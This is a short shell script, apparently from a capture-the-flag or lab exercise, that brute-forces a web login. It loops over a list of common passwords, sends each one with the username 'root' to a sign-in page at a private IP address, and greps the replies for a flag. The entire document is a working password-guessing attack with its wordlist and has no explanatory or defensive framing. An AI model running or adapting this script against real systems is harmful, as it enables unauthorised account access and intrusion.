pass_list="123456
password 
12345678 
qwerty 
abc123 
123456789 
111111 
1234567 
iloveyou 
adobe123 
123123 
Admin 
1234567890 
letmein 
photoshop 
1234 
monkey 
shadow 
sunshine 
12345 
password1 
princess 
azerty 
trustno1 
000000"
# pass_list="shadow"


for i in $pass_list; do
	echo "\npassword: $i\n"
    curl -X POST "http://10.111.1.21/index.php?page=signin&username=root&password=${i}&Login=Login#" | grep flag
done